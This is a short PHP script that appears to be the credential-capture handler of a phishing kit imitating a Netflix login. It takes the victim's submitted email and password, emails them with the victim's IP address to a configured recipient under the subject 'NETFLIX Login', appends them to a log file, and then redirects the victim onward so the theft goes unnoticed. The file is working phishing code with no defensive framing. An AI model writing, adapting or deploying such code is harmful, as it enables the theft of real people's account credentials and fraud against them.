<?php
session_start();
require_once("../../inc/config.inc.php");
require_once("../../inc/function.inc.php");

$_SESSION['Email'] = $_POST['login_user'];
$_SESSION['Password'] = $_POST['login_pass'];
$ip = $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$subject = $_SESSION['subject'] = "$ip - NETFLIX Login ***" ;
$to = $setting["mail_to"];

send($_SESSION,$to, $subject);
$_SESSION['logged_in'] = "true";
$logss = $_SESSION['info'] = $ip."|".$_POST['login_user']."|".$_POST['login_pass']."<br>";
$file = fopen("../../inc/login.php","a");
fwrite($file,$logss);
fclose($file);
header("location: ../account");
?>
